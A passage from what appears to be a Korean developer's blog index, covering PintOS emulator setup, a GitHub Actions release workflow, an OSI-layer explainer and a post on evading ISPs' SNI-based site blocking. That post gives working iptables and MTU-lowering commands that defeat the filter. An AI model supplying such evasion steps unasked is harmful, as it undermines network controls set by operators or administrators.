Bochs다.\nBochs PintOS를 실행하려면 Bochs에 몇 가지 부가적인 설정이 필요하기 때문에 직접 빌드해서 설치해야한다. 우선 여기에서 최신 버전의 Bochs를 다운받는다. 소스코드의 경우 gzip으로 압축되어 있다. 압축된 소스코드를 압축해제한다.\ntar -xvf bochs-[버전].tar.gz 압축을 해제한 디렉토리에 들어가 Bochs를 빌드 후 설치한다. 작업 수는 CPU 코어 수의 2배를 권장한다.\ncd bochs-[버전] ./configure --with-term --with-nogui --enable-gdb-stub make -j[작업 수] make install [프로젝트 루트]/src/threads 디렉토리에서 pintos 명령어로 Bochs로 가상화된 PintOS를 실행한다.\ncd [프로젝트 루트]/src/threads pintos run alarm-multiple 아래와 같은 출력이 나왔다면 정상적으로 실행된 것이다.\nbochs -q ======================================================================== Bochs x86 Emulator 2.7 Built from SVN snapshot after release 2.7 Compiled on Aug 19 2021 at 20:15:34 ======================================================================== 00000000000i[ ] BXSHARE not set. using compile time default \u0026#39;/usr/local/share/bochs\u0026#39; 00000000000i[ ] reading configuration from bochsrc.txt 00000000000i[ ] installing nogui module as the Bochs GUI 00000000000i[ ] using log file bochsout.txt PiLo hda1 Loading............ Kernel command line: run alarm-multiple Pintos booting with 4,096 kB RAM... 383 pages available in kernel pool. QEMU x86 시스템을 가상화하기위한 QEMU를 설치한다.\nsudo apt install qemu-system-x86 QEMU로 PintOS를 실행하기 위해서 각 빌드 디렉토리의 Make.vars의 SIMULATOR 값을 수정해줘야 한다. threads, userprog, vm, filesys 등의 파일에 있는 Make.vars 파일을 아래와 같이 수정한다.\n- SIMULATOR = --bochs + SIMULATOR = --qemu PintOS를 기본으로 QEMU로 실행하기 위해서 [프로젝트 루트]/src/utils/pintos의 104번째 줄을 다음과 같이 수정한다.\n- $sim = \u0026#34;bochs\u0026#34; if !defined $sim; + $sim = \u0026#34;qemu\u0026#34; if !defined $sim; 수정을 완료했다면 make 명령어로 커널을 빌드한다.\npwd [프로젝트 루트]/src/threads make -j[작업 수] Bochs와 마찬가지로 pintos 명령어로 alarm-multiple 프로젝트를 실행해보면 정상적으로 PintOS가 QEMU로 실행됐음을 확인할 수 있다.\npintos run alarm-multiple SeaBIOS (version 1.13.0-1ubuntu1.1) Booting from Hard Disk... PPiiLLoo hhddaa1 1 LLooaaddiinngg....................... Kernel command line: run alarm-multiple Pintos booting with 3,968 kB RAM... 367 pages available in kernel pool. 367 pages available in user pool. Calibrating timer... 314,163,200 loops/s. Boot complete. Executing \u0026#39;alarm-multiple\u0026#39;: (alarm-multiple) begin (alarm-multiple) Creating 5 threads to sleep 7 times each. (alarm-multiple) Thread 0 sleeps 10 ticks each time, (alarm-multiple) thread 1 sleeps 20 ticks each time, and so on. (alarm-multiple) If successful, product of iteration count and (alarm-multiple) sleep duration will appear in nondescending order. (alarm-multiple) thread 0: duration=10, iteration=1, product=10 (alarm-multiple) thread 1: duration=20, iteration=1, product=20 (alarm-multiple) thread 0: duration=10, iteration=2, product=20 (alarm-multiple) thread 2: duration=30, iteration=1, product=30 (alarm-multiple) thread 0: duration=10, iteration=3, product=30 (alarm-multiple) thread 0: duration=10, iteration=4, product=40 (alarm-multiple) thread 1: duration=20, iteration=2, product=40 (alarm-multiple) thread 3: duration=40, iteration=1, product=40 (alarm-multiple) thread 4: duration=50, iteration=1, product=50 (alarm-multiple) thread 0: duration=10, iteration=5, product=50 (alarm-multiple) thread 0: duration=10, iteration=6, product=60 (alarm-multiple) thread 1: duration=20, iteration=3, product=60 (alarm-multiple) thread 2: duration=30, iteration=2, product=60 (alarm-multiple) thread 0: duration=10, iteration=7, product=70 (alarm-multiple) thread 3: duration=40, iteration=2, product=80 (alarm-multiple) thread 1: duration=20, iteration=4, product=80 (alarm-multiple) thread 2: duration=30, iteration=3, product=90 (alarm-multiple) thread 4: duration=50, iteration=2, product=100 (alarm-multiple) thread 1: duration=20, iteration=5, product=100 (alarm-multiple) thread 2: duration=30, iteration=4, product=120 (alarm-multiple) thread 3: duration=40, iteration=3, product=120 (alarm-multiple) thread 1: duration=20, iteration=6, product=120 (alarm-multiple) thread 1: duration=20, iteration=7, product=140 (alarm-multiple) thread 2: duration=30, iteration=5, product=150 (alarm-multiple) thread 4: duration=50, iteration=3, product=150 (alarm-multiple) thread 3: duration=40, iteration=4, product=160 (alarm-multiple) thread 2: duration=30, iteration=6, product=180 (alarm-multiple) thread 4: duration=50, iteration=4, product=200 (alarm-multiple) thread 3: duration=40, iteration=5, product=200 (alarm-multiple) thread 2: duration=30, iteration=7, product=210 (alarm-multiple) thread 3: duration=40, iteration=6, product=240 (alarm-multiple) thread 4: duration=50, iteration=5, product=250 (alarm-multiple) thread 3: duration=40, iteration=7, product=280 (alarm-multiple) thread 4: duration=50, iteration=6, product=300 (alarm-multiple) thread 4: duration=50, iteration=7, product=350 (alarm-multiple) end Execution of \u0026#39;alarm-multiple\u0026#39; complete. ","permalink":"https://pol4bear.github.io/posts/pintos-development-1/","summary":"PintOS란? PintOS는 스탠포드 대학교 컴퓨터 공학과 수업 CS 140을 위해 개발된 교육용 mini OS이다. Pintos Project는 총 4단계로 나누어져 있으며, 각 단계 별로 OS의 필수 구현 사항들을 완성하게 된다.\nPintOS 개발에 필요한 기본적인 정보들과 과제들은 여기에서 확인할 수 있다.\nPintOS 빌드 환경 구축 PintOS 개발환경 구축은 리눅스 기반의 OS에 설정하도록 한다. 필자의 경우 윈도우에서 제공하는 WSL2를 이용하여 Ubuntu 20.04에서 환경을 구성했다.\n패키지 설치하기 소스코드를 가져오기 전 빌드에 필요한 패키지가 몇 가지 있다.","title":"PintOS 개발 시작하기"},{"content":"​\nGitHub Actions란? GitHub Actions은 가장 많이 사용되는 git 서비스인 GitHub에서 제공하는 빌드, 테스트, 배포 자동화 기능이다. 요즘 주변을 둘러보면 버전관리에서 더 나아가 빌드, 테스트, 배포를 자동화하는 것을 쉽게 찾아볼 수 있다. 이러한 것들을 해주는 것 중 대표적인 것은 바로 Jenkins다. 하지만, 개인마다 Jenkins 서버를 운영할 수 도 없기 때문에 개인 프로젝트나 오픈소스 프로젝트에는 사용하기 힘든 상황이다.\nGitHub Actions의 경우 GitHub의 서버를 이용하기 때문에 별도의 서버를 구성할 필요가 없기 때문에 이러한 제약사항에서 자유롭다는 것이 가장 큰 장점인 것 같다. 심지어 공개 리포지토리의 경우 요청 횟수에 제한 없이 무료(!)로 제공하고 있다. 비공개 리포지토리의 경우에도 Free 플랜 기준 월 2,000분 까지 무료로 제공한다.\n​\nC/C++ 프로젝트에 어떻게 적용할까? GitHub Actions를 이용하면 평소에 수동으로 해왔던 것들을 모두 자동화할 수 있다. C/C++ 프로젝트를 진행할 때도 마찬가지다. 아래는 자동화하면 편할만한 것들을 생각해본 것이다.\n자동으로 프로젝트 빌드 가능 여부 테스트하기 자동으로 코드 유효성을 테스트하기 새로운 릴리즈할 때 프로젝트를 자동으로 빌드해서 배포 이 것들 외에도 GitHub Actions에서는 GitHub에서 새로운 PR을 테스트하고 자동으로 닫는 등 GitHub API를 요구하는 작업도 가능하다.\n​\n내 C/C++ 프로젝트에 적용해보기 프로그램을 만들 때 자연스롭게 버전 관리를 하게된다. 새로운 버전을 릴리즈할 때 프로젝트를 각 OS마다 자동으로 빌드에서 배포해주면 여러모로 좋을 것 같다. 아래는 CMake를 사용하는 프로젝트에서 새로운 버전 태그가 푸쉬되면 Linux, Windows, MacOS에서 빌드해서 배포해주는 워크플로우다.\non: push: tags: - \u0026#34;v*\u0026#34; name: Create Release jobs: create_release: name: Create Release runs-on: ubuntu-latest steps: - name: Checkout code uses: actions/checkout@v2 - name: Extract tag name id: tag run: echo ::set-output name=VERSION::${GITHUB_REF#refs/tags/} - name: Create Release id: create_release uses: actions/create-release@v1 env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} with: tag_name: ${{ github.ref }} release_name: Release ${{ github.ref }} body: | Check [here](https://github.com/pol4bear/${{ github.event.repository.name }}/blob/${{ steps.tag.outputs.VERSION }}/CHANGES.md) to see what has changed. draft: false prerelease: false build_and_deploy: name: Deploy Library needs: [create_release] strategy: fail-fast: false matrix: os: [ubuntu-latest, macos-latest, windows-latest] include: - os: ubuntu-latest arch: linux-x64 - os: macos-latest arch: osx-x64 - os: windows-latest arch: windows-x64 runs-on: ${{ matrix.os }} steps: - uses: actions/checkout@v2 - name: Get release id: get_release uses: bruceadams/get-release@v1.2.2 env: GITHUB_TOKEN: ${{ github.token }} - name: Get latest CMake and ninja uses: lukka/get-cmake@latest - name: Set shared library extension for Linux if: matrix.os == \u0026#39;ubuntu-latest\u0026#39; env: SHARED_EXT: .so run: | echo \u0026#34;SHARED_EXT=$SHARED_EXT\u0026#34; \u0026gt;\u0026gt; $GITHUB_ENV echo \u0026#34;Set shared library to \u0026#39;$SHARED_EXT\u0026#39;\u0026#34; - name: Set shared library extension for MacOS if: matrix.os == \u0026#39;macos-latest\u0026#39; env: SHARED_EXT: .dylib run: | echo \u0026#34;SHARED_EXT=$SHARED_EXT\u0026#34; \u0026gt;\u0026gt; $GITHUB_ENV echo \u0026#34;Set shared library to \u0026#39;$SHARED_EXT\u0026#39;\u0026#34; - name: Set shared library extension for Windows if: matrix.os == \u0026#39;windows-latest\u0026#39; env: SHARED_EXT: .dll run: | echo \u0026#34;SHARED_EXT=$env:SHARED_EXT\u0026#34; \u0026gt;\u0026gt; $env:GITHUB_ENV echo \u0026#34;Set shared library to \u0026#39;$env:SHARED_EXT\u0026#39;\u0026#34; - name: Build Library run: | cmake -G Ninja -S . -B ${{ runner.workspace }}/static cmake --build ${{ runner.workspace }}/static -j 2 cmake -G Ninja -S . -B ${{ runner.workspace }}/shared -Dtype=shared cmake --build ${{ runner.workspace }}/shared -j 2 - name: ZIP Library uses: papeloto/action-zip@v1 with: files: ../static/${{ github.event.repository.name }}.a ../shared/${{ github.event.repository.name }}${{ env.SHARED_EXT}} - name: Upload Library uses: actions/upload-release-asset@v1 env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} with: upload_url: ${{ steps.get_release.outputs.upload_url }} asset_path: \u0026#34;${{ github.workspace }}/result.zip\u0026#34; asset_name: \u0026#34;${{ matrix.arch }}.zip\u0026#34; asset_content_type: application/zip ​\n워크플로우 분석 GitHub Actions의 워크플로우는 yaml 파일로 작성하게 된다. 위 워크플로우를 하나하나 살펴보자.\n우선 이 워크플로우는 \u0026ldquo;v*\u0026ldquo;에 맞는 태그가 푸쉬되면 실행되도록 한다.\non: push: tags: - \u0026#34;v*\u0026#34; 그리고, 워크플로우의 이름을 \u0026ldquo;Create Release\u0026quot;로 하고 실행할 작업들을 설정한다.\nname: Create Release create_release라는 작업을 만들고 해당 작업의 이름을 \u0026ldquo;Create Release\u0026quot;로, 작동 서버를 ubuntu-latest로 설정한다.\njobs: create_release: name: Create Release runs-on: ubuntu-latest 그 후 create_release 작업에서 실행할 것들을 정의한다. 아래 절차를 통해 태그 이름을 기반으로 새로운 릴리즈를 생성하게 된다.\nsteps: - name: Checkout code uses: actions/checkout@v2 - name: Extract tag name id: tag run: echo ::set-output name=VERSION::${GITHUB_REF#refs/tags/} - name: Create Release id: create_release uses: actions/create-release@v1 env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} with: tag_name: ${{ github.ref }} release_name: Release ${{ github.ref }} body: | Check [here](https://github.com/pol4bear/${{ github.event.repository.name }}/blob/${{ steps.tag.outputs.VERSION }}/CHANGES.md) to see what has changed. draft: false prerelease: false 이제 프로젝트를 빌드하고 배포하기 위한 작업을 정의한다. build_and_deploy라는 작업을 만들고 이름을 \u0026ldquo;Deploy Library\u0026quot;로 하고 create_release 작업이 반드시 선행되게 설정한다.\nbuild_and_deploy: name: Deploy Library needs: [create_release] 빌드의 경우 ubuntu-latest, macos-latest, windows-latest 세 가지 OS에서 진행하게 된다. 전반적인 빌드와 배포 과정은 비슷하기 때문에 GitHub Actions의 Matrix 기능을 이용하도록 한다.\nstrategy: fail-fast: false matrix: os: [ubuntu-latest, macos-latest, windows-latest] include: - os: ubuntu-latest arch: linux-x64 - os: macos-latest arch: osx-x64 - os: windows-latest arch: windows-x64 runs-on: ${{ matrix.os }} 아래 과정을 통해 프로젝트를 빌드하고 압축해서 배포한다. 세 가지의 OS 모두 동적 라이브러리의 확장자가 다르기 때문에 환경변수로 OS에 맞는 확장자를 설정한다.\nsteps: - uses: actions/checkout@v2 - name: Get release id: get_release uses: bruceadams/get-release@v1.2.2 env: GITHUB_TOKEN: ${{ github.token }} - name: Get latest CMake and ninja uses: lukka/get-cmake@latest - name: Set shared library extension for Linux if: matrix.os == \u0026#39;ubuntu-latest\u0026#39; env: SHARED_EXT: .so run: | echo \u0026#34;SHARED_EXT=$SHARED_EXT\u0026#34; \u0026gt;\u0026gt; $GITHUB_ENV echo \u0026#34;Set shared library to \u0026#39;$SHARED_EXT\u0026#39;\u0026#34; - name: Set shared library extension for MacOS if: matrix.os == \u0026#39;macos-latest\u0026#39; env: SHARED_EXT: .dylib run: | echo \u0026#34;SHARED_EXT=$SHARED_EXT\u0026#34; \u0026gt;\u0026gt; $GITHUB_ENV echo \u0026#34;Set shared library to \u0026#39;$SHARED_EXT\u0026#39;\u0026#34; - name: Set shared library extension for Windows if: matrix.os == \u0026#39;windows-latest\u0026#39; env: SHARED_EXT: .dll run: | echo \u0026#34;SHARED_EXT=$env:SHARED_EXT\u0026#34; \u0026gt;\u0026gt; $env:GITHUB_ENV echo \u0026#34;Set shared library to \u0026#39;$env:SHARED_EXT\u0026#39;\u0026#34; - name: Build Library run: | cmake -G Ninja -S . -B ${{ runner.workspace }}/static cmake --build ${{ runner.workspace }}/static -j 2 cmake -G Ninja -S . -B ${{ runner.workspace }}/shared -Dtype=shared cmake --build ${{ runner.workspace }}/shared -j 2 - name: ZIP Library uses: papeloto/action-zip@v1 with: files: ../static/${{ github.event.repository.name }}.a ../shared/${{ github.event.repository.name }}${{ env.SHARED_EXT }} - name: Upload Library uses: actions/upload-release-asset@v1 env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} with: upload_url: ${{ steps.get_release.outputs.upload_url }} asset_path: \u0026#34;${{ github.workspace }}/result.zip\u0026#34; asset_name: \u0026#34;${{ matrix.arch }}.zip\u0026#34; asset_content_type: application/zip ​\n사용 후기 이번 기회에 GitHub Actions를 처음 사용해보면서 많은 삽질을 한 것 같다. 나온지 오래되지 않았음에도 이미 지원종료된 기능들이 있음에도 구글링을 해보면 유효하지 않은 해결방법들을 제시하는 자료들이 많았다. 그래도 GitHub에서 자료를 자세하게 제공해줘서 찾아보면서 사용하는데는 문제 없을 것 같다. GitHub Actions를 작성하는 시간이 수동으로 하는 시간보다 오래걸릴 수 있지만 익숙해지면 여러가지 면에서 편해질 것 같다.\n","permalink":"https://pol4bear.github.io/posts/using-github-actions-in-c-cpp-project/","summary":"​\nGitHub Actions란? GitHub Actions은 가장 많이 사용되는 git 서비스인 GitHub에서 제공하는 빌드, 테스트, 배포 자동화 기능이다. 요즘 주변을 둘러보면 버전관리에서 더 나아가 빌드, 테스트, 배포를 자동화하는 것을 쉽게 찾아볼 수 있다. 이러한 것들을 해주는 것 중 대표적인 것은 바로 Jenkins다. 하지만, 개인마다 Jenkins 서버를 운영할 수 도 없기 때문에 개인 프로젝트나 오픈소스 프로젝트에는 사용하기 힘든 상황이다.\nGitHub Actions의 경우 GitHub의 서버를 이용하기 때문에 별도의 서버를 구성할 필요가 없기 때문에 이러한 제약사항에서 자유롭다는 것이 가장 큰 장점인 것 같다.","title":"C/C++ 프로젝트에 GitHub Actions 적용하기"},{"content":"지금까지 여러번의 면접을 봤었는데 특히 네트워크 분야의 기술 면접에 가면 면접관이 가장 먼저 물어보는 질문은 항상 OSI 7 계층이었다. 컴퓨터 학과에 입학하면 주구장창 외우라고 하지만 이것을 이해하려면 컴퓨터에 대한 이해가 어느정도 필요하기 때문에 사실 이해하기 쉽지만은 않다.\n하지만 OSI 7 계층은 네트워크 프로토콜에 대해 이해하기 위해서 필연적인 것이라고 생각한다. OSI 7 계층은 국제표준화기구에서 네트워크 프로토콜 디자인과 네트워크 통신을 계층별로 구분한 것이기 때문에 OSI 7 계층을 이해할 수 있다면 네트워크 통신과 네트워크 프로토콜도 쉽게 이해할 수 있을 것이다.\nOSI 7 계층 OSI 7 계층은 다음과 같다.\n일반적으로 OSI 7 계층을 설명할때 end-to-end로 데이터를 전송할 때 아래와 같이 OSI 7 계층을 지나간다고 한다.\nOSI 7 계층이 결국 네트워크 통신을 계층별로 구분해놓은 것이기 때문에 결론적으론 이런 과정을 거쳐서 데이터의 송/수신이 이루어지는 것이 맞다. 이제 각 계층에서 어떤 역할들을 하는지 알아보도록 하자.\nL1 - 물리 네트워크 통신에서 데이터들은 전기 신호로 변환되서 회선을 타고 스위치, 라우터 등의 장비를 거쳐 전송되게 된다. 물리 계층은 전기 신호로 변환된 데이터들이 전송되는 것을 말한다.\n물리 계층에서 전송되는 데이터의 단위를 심볼(Symbol)이라고 한다. 심볼을 알기 위해선 비트를 먼저 알아야 하는데 이 비트는 전기 신호의 켜진/꺼진 상태를 말하는데 켜지면 1로 꺼지면 0으로 데이터를 표현한다. 심볼은 하나 이상의 의미 있는 비트들로 이루어진 단위다.\n물리 계층에 속하는 네트워크 장비는 다음과 같은 것들이 있다.\n케이블: 장비에서 장비로 전기 신호의 전송을 담당한다. 허브: 여러 대의 장비를 연결하여 상호 간에 통신할 수 있도록 한다. 리피터: 전기 신호를 수신하여 증폭하여 더 먼 거리로 전송할 수 있도록 한다. L2 - 데이터 링크 데이터 링크 계층은 같은 네트워크 즉 근거리 통신망(LAN)에 속한 노드와 노드 사이의 신뢰성 있는 통신을 지원한다. 신뢰성 있는 통신을 위해서 물리 계층에서 발생할 수 있는 오류를 감지하고 고칠 수 있는 기능을 제공한다.\n데이터 링크 계층에서 두 개의 노드의 연결을 논리적으로 설정/해제 할 수 있는 프로토콜을 정의하고 있다. 이 프로토콜들의 헤더는 네트워크 패킷 상에서 가장 앞부분에 위치하기 때문에 쉽게 찾아볼 수 있다. 하드웨어 주소인 맥 주소(MAC address)를 이용한 근거리 통신망의 노드들과 허브, 스위치, 라우터 등의 장치 사이의 통신을 지원한다.\n데이터 링크 계층에서는 이더넷 헤더에 포함된 모든 것들이 페이로드다. 데이터 링크 계층의 프레임은 L2 프로토콜의 헤더와 페이로드 그리고 오류를 감지하기 위한 CRC 값을 포함한다.\n데이터 링크 계층을 쉽게 말한다면 스위치나 AP의 근거리 통신망의 통신을 담당하는 계층이다. 중요한 것은 근거리 통신망에서는 맥 주소로 통신을 한다는 것이다.\n네트워크 환경에서 자주 접하는 데이터 링크 계층의 프로토콜은 다음과 같다.\n이더넷(Ethernet): 근거리 통신망(LAN)의 통신에 사용 ARP(Address Resolution Protocol): IP 주소로 맥 주소를 알아내는데 사용 L3 - 네트워크 네트워크 계층은 특정 길이의 패킷을 다른 네트워크에 연결되어 있는 노드로 전송할 수 있는 기능적, 절차적 수단을 제공한다. 모든 노드는 각자의 주소를 가지고 있기 때문에 다른 네트워크에 데이터를 보내더라도 목적지 주소를 표시하면 전송이 가능하다. 목적지 주소로 전송하는 길을 설정하는 라우팅도 네트워크 계층의 기능 중 하나로써 데이터가 성공적으로 목적지에 도달할 수 있도록 한다.\n페이로드가 MTU 제한에 걸려 전송할 수 없다면 송신 노드에서 여러 조각으로 단편화해서 전송하고 수신 노드에서 여러 조각을 전송받아 재조립해서 데이터가 정상적으로 전송될 수 있도록 한다. 또한, 전송 과정에서 문제가 있었는지 알릴 수 있는 기능도 포함하는데 필수적인 것은 아니다.\n네트워크 계층에서는 한번에 전송하기 힘든 크기의 페이로드의 전송을 요청받았다면 이를 여러개의 세그먼트 혹은 데이터그램으로 단편화할 수 있다. 패킷은 목적 노드로 전송을 위한 프로토콜 헤더와 세그먼트 혹은 데이터그램을 포함한다.\n네트워크 계층의 프로토콜은 다음과 같다.\nIP(Internet Protocol): 송신 노드와 수신 노드 사이의 통신에서 IP 주소를 통한 전송과 패킷 단편화와 재조립 기능을 제공. IPv6(Internet Protocol version 6): 4 바이트로 이루어진 IP주소의 고갈을 대비한 차세대 인터넷 프로토콜. 4 바이트의 IP에 비해 16 바이트로 2^128 만큼의 주소를 사용할 수 있다. L4 - 전송 전송 계층은 QoS를 유지하면서 특정 길이의 데이터를 호스트에서 호스트로 전송할 수 있는 기능적, 절차적 수단을 제공한다. 전송 계층은 통신의 신뢰성을 위해 흐름 제어, 단편화/재조립, 오류 제어 기능을 제공한다. 전송 계층에서는 데이터 전송이 성공적이었는지 확인하고 오류가 없는 것이 확인되면 다음 데이터를 전송하는 기능을 제공한다. TCP와 같은 연결 지향적인 프로토콜은 오류가 발생했을때 재전송하는 기능까지 제공한다. 전송 계층은 응용 계층으로부터 메시지를 전달받아 메시지의 크기가 MSS를 넘어간다면 여러개의 짧은 메시지(세그먼트)로 단편화한다.\n전송 계층에는 클래스 0부터 4(혹은 TP0부터 TP4)까지 총 5개의 클래스로 프로토콜을 분류한다. TP0은 가장 적은 기능을 제공하는 클래스다. 오류 정정 기능 없이 오류로부터 안전한 연결을 네트워크 계층을 위해 디자인되었다. 반면 TP4의 기능은 TCP의 기능과 비슷하다.\n세그먼트 혹은 데이터그램은 전송 계층 프로토콜의 헤더와 페이로드(응용 프로그램의 메시지)를 포함한다. 이 메시지는 프로토콜의 MSS에 따라 여러개의 짧은 메시지로 단편화될 수 있다. TCP는 이 전송 단위를 세그먼트라고 하는 반면 UDP는 데이터그램이라고 한다. 세그먼트 혹은 데이터그램은 다음과 같다.\nL5 - 세션 세션 계층은 컴퓨터 간의 연결을 제어한다. 로컬 또는 원격 응용프로그램의 연결 시작과 제어 그리고 종료하는 기능한다. 전이중과 반이중, 단방향 통신과 세션의 현재 상태 기억, 일시 중지, 재시작, 종료을 제공합니다. 세션 계층에서는 전송 계층 프로토콜인 TCP에서 제공하는 세션의 정상적인 종료를 책임진다. 이 계층에서는 세션의 현재 상태 기억과 복원도 책임지는데 이 기능은 인터넷 환경에서 거의 쓰이지 않는다.\nL6 - 표현 표현 계층은 응용 계층 개체간의 컨텍스트들의 변환을 구현한다. 쉽게 말해서 다른 방식으로 표현된 데이터를 해석한다고 생각하면 된다.\n응용 계층의 개체들은 같은 데이터를 다른 방식으로 표현할 수 있는데 표현 계층은 다른 방식으로 표현된 개체를 자신의 방식으로 또는 자신의 방식으료 표현된 개체를 다른 방식으로 매핑한다. 만약 매핑이 가능하면 표현 계층의 데이터가 프로토콜 데이터로 변환되어 다른 계층으로 전달된다.\n표현 계층에서 담당하는 기능은 다음과 같다.\n문자 코드 번역. EBCDIC로 인코딩된 데이터를 ASCII로 변환 데이터 변환. 객체 및 기타 데이터를 XML 방식으로 구조화 또는 반대로 XML을 객체 및 기타 데이터로 변환. 데이터 압축/압축해제 데이터의 암호화/복호화 L7 - 응용 응용 계층은 서비스를 사용하는 사용자에게 가장 가까운 계층이다. 우리가 아는 대다수의 서비스(HTTP, SSH, Telnet, SMTP, POP3, IMAP etc.)가 이 응용 계층이 속한다. 네트워크 환경에서 데이터 전송에 관련된 물리 계층부터 세션 계층과는 다르게 실제 서비스에 필요한 메타데이터들이 응용 계층 프로토콜의 헤더에 포함되고 데이터도 마찬가지다. 여러 역할을 하는 서비스가 존재하는 만큼 프로토콜의 생김새또한 제각각이고 필수적인 요소도 존재하지 않는다. 실생활에서 사용하는 네트워크를 사용하는 서비스들의 모든 프로토콜이 응용 계층에 속한다. 응용 계층의 프로토콜은 다른 호스트로 전송하기 위해 L2(이더넷), L3(IP), L4(TCP, UDP) 등의 프로토콜과 함께 사용된다.\n","permalink":"https://pol4bear.github.io/posts/what-is-osi-7-layer/","summary":"지금까지 여러번의 면접을 봤었는데 특히 네트워크 분야의 기술 면접에 가면 면접관이 가장 먼저 물어보는 질문은 항상 OSI 7 계층이었다. 컴퓨터 학과에 입학하면 주구장창 외우라고 하지만 이것을 이해하려면 컴퓨터에 대한 이해가 어느정도 필요하기 때문에 사실 이해하기 쉽지만은 않다.\n하지만 OSI 7 계층은 네트워크 프로토콜에 대해 이해하기 위해서 필연적인 것이라고 생각한다. OSI 7 계층은 국제표준화기구에서 네트워크 프로토콜 디자인과 네트워크 통신을 계층별로 구분한 것이기 때문에 OSI 7 계층을 이해할 수 있다면 네트워크 통신과 네트워크 프로토콜도 쉽게 이해할 수 있을 것이다.","title":"OSI 7 계층이란?"},{"content":"서론 2019년 3월 전까지만 해도 HTTP의 Host 필드를 보고 차단하는 방식이었기 때문에 HTTPS를 이용하면 쉽게 우회할 수 있는 상태였다. 하지만 2019년 3월 대망의 SNI 기반의 유해사이트 차단 장비가 KT에서부터 시작해서 국내 이동통신사 3사에 순차적으로 적용되었다.\n꿈도 희망도 없을줄 알았지만 나오자마자 여러가지 취약점이 터져 나오면서 문제없이 유해사이트에 접속할 수 있게 되었다. 한번 SNI 기반 유해사이트 차단 장비를 우회하는 방법에 대해서 알아보자.\nSNI 기반 유해사이트 차단 장비 원리 HTTPS로 사이트를 접속하면 우편으로 보면 주소지와 비슷하게 접속하는 아래같이 서버의 이름이 보인다. 이것을 SNI라고 하는데, SNI 기반 유해사이트 차단 장비(이하 SNI 차단 장비)는 이 SNI를 보고 유해사이트인지 판별해서 차단하는 방식이다.\nSNI 차단 장비는 위 사진과 같이 서버 이름을 보고 만약 유해사이트 목록에 존재한다면 TCP에서 상대방과의 연결을 강제로 끊어버리는 RST 패킷을 전송하여 클라이언트가 유해사이트에 접속하는 것을 막는다. 하지만, 위 사진에 있다시피 서버 이름만 알 수 있고, 정확한 URL은 알아낼 수 없기 때문에 정상적인 사이트 아래 돌아가는 유해한 페이지는 차단할 수 없다. 예를 들어 twitter.com/xxx, facebook.com/xxx, google.com/xxx 등이 있다. 기능만 보면 아주 간단해 보이지만, TCP의 흐름제어 기능때문에 모든 트래픽의 흐름을 차단 장비도 기억하고 있어야하기 때문에 구현이 쉽지는 않다.\nRST를 무시하는 방법 현재는 대부분의 SNI 차단 장비에서 막혔지만 통신사에 따라 지역에 따라 사용 가능할 수 있는 방법이다. SNI 차단 장비 도입 초기에는 네트워크 트래픽 때문인지, 장비 성능 때문인지 클라이언트에게 밖에 RST 패킷을 보내지 않았다. 차단 장비가 유해사이트를 탐지해서 차단했더라도 클라이언트에게만 RST를 보냈기 때문에 서버는 연결이 끊겼는지 알지 못했다. 그렇기 때문에, 클라이언트가 자신에게 오는 RST 패킷을 무시해버리는 방법으로 쉽게 차단 우회가 가능했다.\n리눅스의 경우 간단하게 iptables 명령어로 사용할 수 있다.\nsudo iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP Client Hello 패킷을 나눠서 보내는 방법 현재도 모든 SNI 차단 장비에서 사용 가능한 방법이다. TCP에서 패킷을 나눠서 보내는 것을 패킷 단편화라고 한다. TCP에서 흐름제어 기능을 제공하기 때문에 패킷을 여러번에 나눠서 보내더라도 목적지에서는 정상적으로 합쳐서 수신할 수 있기 때문에 접속하는데 문제는 없다. 하지만, 여러번에 나눠서 보내기 때문에 VPN이나 프록시를 이용하는 것보다는 훨씬 빠르지만, 약간의 속도 저하가 있을 수 있다.\n현재 모든 SNI 차단 장비에서 단편화된 패킷에 대해서 장비 성능 문제 때문인지, 재조합을 진행하고 있지 않다. 모든 HTTPS 통신은 Handshake 통신을 하게되고, Handshake 통신은 일정한 시그니처를 가지고 있다. SNI 차단 장비는 패킷의 처음부터 분석해나가며 서버 이름(SNI)를 찾아서 차단하는 방식으로 동작하는데, 시그니처가 있는 패킷의 처음 부분과 SNI가 함께 있지 않다면 패킷을 재조합하지않는 현재의 SNI 차단 장비 특성상 우회할 수 있게된다.\n패킷 단편화를 제공하는 프로그램 많이 나와 있다.\n단순히 패킷을 단편화해서 우회시키는 방법이다보니 프로그램 없이 명령어로 MTU만 조절해도 우회가 가능하다.\n윈도우\n// 재부팅하면 원상복구되게 netsh interface ipv4 set global minmtu=400 store=active // 반영구적으로 적용되게 netsh interface ipv4 set global minmtu=400 store=persistent 리눅스\nsudo ip link set wlp0s20f0u1u3 mtu 400 ","permalink":"https://pol4bear.github.io/posts/how-to-bypass-sni-blocking-equipment/","summary":"서론 2019년 3월 전까지만 해도 HTTP의 Host 필드를 보고 차단하는 방식이었기 때문에 HTTPS를 이용하면 쉽게 우회할 수 있는 상태였다. 하지만 2019년 3월 대망의 SNI 기반의 유해사이트 차단 장비가 KT에서부터 시작해서 국내 이동통신사 3사에 순차적으로 적용되었다.\n꿈도 희망도 없을줄 알았지만 나오자마자 여러가지 취약점이 터져 나오면서 문제없이 유해사이트에 접속할 수 있게 되었다. 한번 SNI 기반 유해사이트 차단 장비를 우회하는 방법에 대해서 알아보자.\nSNI 기반 유해사이트 차단 장비 원리 HTTPS로 사이트를 접속하면 우편으로 보면 주소지와 비슷하게 접속하는 아래같이 서버의 이름이 보인다.","title":"SNI 기반 유해사이트 차단 장비를 우회하는 방법"},{"content":"유해사이트 차단에 대한 내 생각 2019년 9월부터 12월까지 거의 4달이라는 시간동안 유해사이트 차단에 대한 프로젝트를 진행했다. 이 프로젝트를 진행하기 전 내 생각도 남들과 다르지 않았다. 도대체 왜 성인인데 성인물을 못보게 막는지 도저히 이해할 수 없었고, 한명의 남자로써 성인물을 못보게 한다는 것이 분에 겨워 당시 청와대 홈페이지에서 청원하던 유해사이트 차단 반대 청원에도 서명도 했었다. 프로젝트를 진행하면서 나왔던 결과물이 디씨인사이드라는 커뮤니티에 노출됐었다. 이메일로 인터넷 검열의 앞잡이냐, 해명해라 등의 이메일을 받아서 읽어보면서 새삼 아직도 유해사이트에 대한 사람들의 인식을 다시 깨닫게 되었다. 프로젝트를 진행하면서 본의든 본의가 아니든 많은 유해사이트를 접해보게 되었고 